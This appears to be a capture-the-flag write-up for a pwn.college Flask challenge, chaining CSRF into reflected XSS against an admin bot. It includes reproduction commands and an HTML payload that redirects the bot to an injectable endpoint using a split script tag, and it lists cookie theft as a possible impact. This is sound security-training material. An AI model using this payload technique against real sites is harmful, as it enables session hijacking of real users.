# CSRF to XSS in pwn.college "pwnpost"

## Description
The "pwnpost" Flask application is vulnerable to a combination of Cross-Site Request Forgery (CSRF) and Reflected Cross-Site Scripting (XSS). An attacker can force an authenticated admin bot to visit a malicious page, which then redirects the bot to the vulnerable `/ephemeral` endpoint, executing arbitrary JavaScript in the context of the admin session.

## Impact
**High.** An attacker can execute arbitrary JavaScript in the browser of an authenticated administrator. In a real-world scenario, this could lead to:
- **Session Hijacking:** Stealing the admin's `auth` cookie to gain full control over the account.
- **Data Exfiltration:** Reading and exfiltrating sensitive data available only to admins.
- **Malicious Actions:** Performing state-changing actions (e.g., deleting posts, changing passwords) on behalf of the admin.

## Reproduction Steps
1. Start the vulnerable server: `./challenge/server &`
2. Start the attacker server: `python3 -m http.server 1337`
3. Place `index.html` in the attacker server root.
4. Submit `http://hacker.localhost:1337` to the admin bot.
5. The bot logs in, visits the page, and the XSS triggers `alert("PWNED")`.

## Payload (`index.html`)
```html
<script>
    var payload = '<scr' + 'ipt>alert("PWNED")</scr' + 'ipt>';
    window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent(payload);
</script>
